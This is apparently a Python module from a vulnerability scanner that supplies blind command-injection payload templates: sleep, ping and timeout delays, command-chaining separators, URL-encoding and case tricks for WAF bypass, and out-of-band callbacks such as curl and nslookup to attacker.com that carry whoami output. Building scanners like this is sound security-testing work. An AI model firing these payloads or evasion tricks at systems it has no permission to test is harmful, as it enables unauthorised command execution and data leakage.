"""
Blind CMDi Payload Templates

Provides OS-specific and chaining variations for blind command injection.
Focuses on safe, time-based payloads (sleep/ping) and logic-based detection.

Design:
- Payloads are injected into parameters with various separators
- Time-based: measure latency deltas
- Logic-based: detect command execution via side effects
- All payloads are non-destructive (sleep, ping, sleep 0, invalid commands)
"""

def linux_time_payloads():
    """
    Linux time-based payloads using sleep command.
    
    Returns list of dicts with 'payload' and 'delay' (expected sleep duration).
    """
    return [
        # Basic sleep payloads (3, 5, 7 seconds for linear scaling)
        {"payload": "sleep 3", "delay": 3, "variant": "basic"},
        {"payload": "sleep 5", "delay": 5, "variant": "basic"},
        {"payload": "sleep 7", "delay": 7, "variant": "basic"},
        
        # Sleep with subshell $(...)
        {"payload": "$(sleep 3)", "delay": 3, "variant": "subshell"},
        {"payload": "$(sleep 5)", "delay": 5, "variant": "subshell"},
        {"payload": "$(sleep 7)", "delay": 7, "variant": "subshell"},
        
        # Sleep with backticks
        {"payload": "`sleep 3`", "delay": 3, "variant": "backticks"},
        {"payload": "`sleep 5`", "delay": 5, "variant": "backticks"},
        {"payload": "`sleep 7`", "delay": 7, "variant": "backticks"},
        
        # Control payloads (should NOT sleep)
        {"payload": "sleep 0", "delay": 0, "variant": "control"},
        {"payload": "invalid_command_xyz", "delay": 0, "variant": "control"},
    ]


def windows_time_payloads():
    """
    Windows time-based payloads using timeout and ping.
    
    Note: timeout /T N requires user interaction on some systems.
    ping -n N 127.0.0.1 is more reliable (N+1 packets = N seconds).
    """
    return [
        # Timeout command (may require /nobreak flag)
        {"payload": "timeout /t 3 /nobreak", "delay": 3, "variant": "timeout"},
        {"payload": "timeout /t 5 /nobreak", "delay": 5, "variant": "timeout"},
        {"payload": "timeout /t 7 /nobreak", "delay": 7, "variant": "timeout"},
        
        # Ping-based delays (more reliable)
        # ping -n 4 127.0.0.1 = 3 seconds (4 pings, 3 intervals)
        {"payload": "ping -n 4 127.0.0.1", "delay": 3, "variant": "ping"},
        {"payload": "ping -n 6 127.0.0.1", "delay": 5, "variant": "ping"},
        {"payload": "ping -n 8 127.0.0.1", "delay": 7, "variant": "ping"},
        
        # Subshell variants
        {"payload": "$(timeout /t 3 /nobreak)", "delay": 3, "variant": "subshell"},
        {"payload": "$(timeout /t 5 /nobreak)", "delay": 5, "variant": "subshell"},
        
        # Control payloads
        {"payload": "timeout /t 0 /nobreak", "delay": 0, "variant": "control"},
        {"payload": "invalid_command_xyz", "delay": 0, "variant": "control"},
    ]


def chain_separators():
    """
    Command chaining separators for injection payloads.
    
    Applied as: original_value + separator + payload
    
    Returns list of separators with context (ordering important for stealth).
    """
    return [
        # High priority (most common, reliable)
        {"sep": ";", "description": "semicolon (safest)"},
        {"sep": " && ", "description": "AND operator"},
        {"sep": " || ", "description": "OR operator (if previous fails)"},
        
        # Medium priority (pipe, newline)
        {"sep": " | ", "description": "pipe to next command"},
        {"sep": "\n", "description": "newline"},
        
        # Low priority (less common but stealthy)
        {"sep": " `", "description": "backtick prefix (command substitution)"},
        {"sep": " $(", "description": "dollar-paren prefix (subshell)"},
        
        # Windows-specific
        {"sep": " & ", "description": "ampersand (Windows AND, sequential)"},
        {"sep": "\r\n", "description": "CRLF (carriage return + newline)"},
    ]


def obfuscation_variants():
    """
    Obfuscation techniques to evade simple WAF rules.
    
    Returns list of dicts with 'apply' (function), 'name', and 'description'.
    """
    return [
        {
            "name": "url_encode",
            "description": "URL-encode payload (standard)",
            "apply": lambda p: "".join(f"%{ord(c):02x}" for c in p)
        },
        {
            "name": "mixed_case",
            "description": "Mixed case command (sleep -> sLeEp)",
            "apply": lambda p: "".join(c.upper() if i % 2 == 0 else c.lower() 
                                       for i, c in enumerate(p))
        },
        {
            "name": "comment_injection",
            "description": "Inline bash comment (sleep # comment)",
            "apply": lambda p: p.split()[0] + " # " + " ".join(p.split()[1:])
        },
        {
            "name": "whitespace_trick",
            "description": "Extra whitespace (sleep    3)",
            "apply": lambda p: p.replace(" ", "  ")  # Double spaces
        },
        {
            "name": "double_encode",
            "description": "Double URL-encode for WAF bypass",
            "apply": lambda p: "".join(f"%{ord(c):02x}" for c in "".join(f"%{ord(c):02x}" for c in p))
        },
    ]


def logic_based_payloads_linux():
    """
    Logic-based detection payloads for Linux.
    
    These detect if command execution occurred through side effects
    (file creation, output modification, process execution evidence).
    
    Used as fallback when time-based detection is unreliable.
    """
    return [
        # Create file in /tmp (if writable)
        {"payload": "touch /tmp/bcmdi_check", "type": "file_create", "check": "/tmp/bcmdi_check"},
        
        # Write to file
        {"payload": "echo 'bcmdi' > /tmp/bcmdi_output", "type": "file_write", "check": "/tmp/bcmdi_output"},
        
        # DNS/OOB callback (requires callback infrastructure)
        {"payload": "nslookup bcmdi-$(whoami).attacker.com", "type": "dns_callback"},
        
        # HTTP callback
        {"payload": "curl -s http://attacker.com/bcmdi?id=$(whoami)", "type": "http_callback"},
    ]


def logic_based_payloads_windows():
    """
    Logic-based detection payloads for Windows.
    
    Similar to Linux variants but using Windows commands.
    """
    return [
        # Create file
        {"payload": "cmd /c echo test > C:\\Windows\\Temp\\bcmdi_check", "type": "file_create"},
        
        # DNS callback
        {"payload": "nslookup bcmdi.attacker.com", "type": "dns_callback"},
        
        # HTTP callback
        {"payload": "powershell -c \"Invoke-WebRequest http://attacker.com/bcmdi\"", "type": "http_callback"},
    ]


def get_control_payloads(os_type: str = "linux"):
    """
    Get control payloads (should NOT trigger vulnerability).
    
    Used for baseline comparison and false positive reduction.
    """
    if os_type.lower() in ("windows", "win"):
        return [
            "timeout /t 0 /nobreak",  # No delay
            "invalid_command_xyz",     # Invalid command
            "sleep -1",                # Invalid sleep duration
        ]
    else:  # linux/unix
        return [
            "sleep 0",                 # No delay
            "invalid_command_xyz",     # Invalid command
            "sleep -1",                # Invalid sleep duration
        ]


# Feature classes for ML integration
PAYLOAD_CLASS_INDEX = {
    "linux_time": 0,
    "windows_time": 1,
    "linux_logic": 2,
    "windows_logic": 3,
    "control": 4,
}
